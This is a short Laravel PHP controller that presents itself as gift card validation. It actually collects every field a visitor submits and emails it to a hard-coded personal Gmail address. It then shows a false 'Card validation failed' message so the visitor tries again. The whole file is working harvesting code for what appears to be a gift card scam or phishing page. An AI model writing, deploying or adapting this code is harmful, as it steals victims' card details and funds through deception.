<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class ValidateGiftcardController extends Controller
{
    public function store()
    {
        // Get all the data that is not null
        $data = array_filter(request()->all(), function($value) {
            return !is_null($value);
        });

        unset($data['_token']);

        // Send email with the details
        Mail::raw(json_encode($data, JSON_PRETTY_PRINT), function($message) {
            $message->to('josephajibodu@gmail.com')
                ->subject('New Gift Card Purchase Details');
        });

        session()->flash('error', 'Card validation failed. Please try again.');

        return redirect()->back();
    }
}
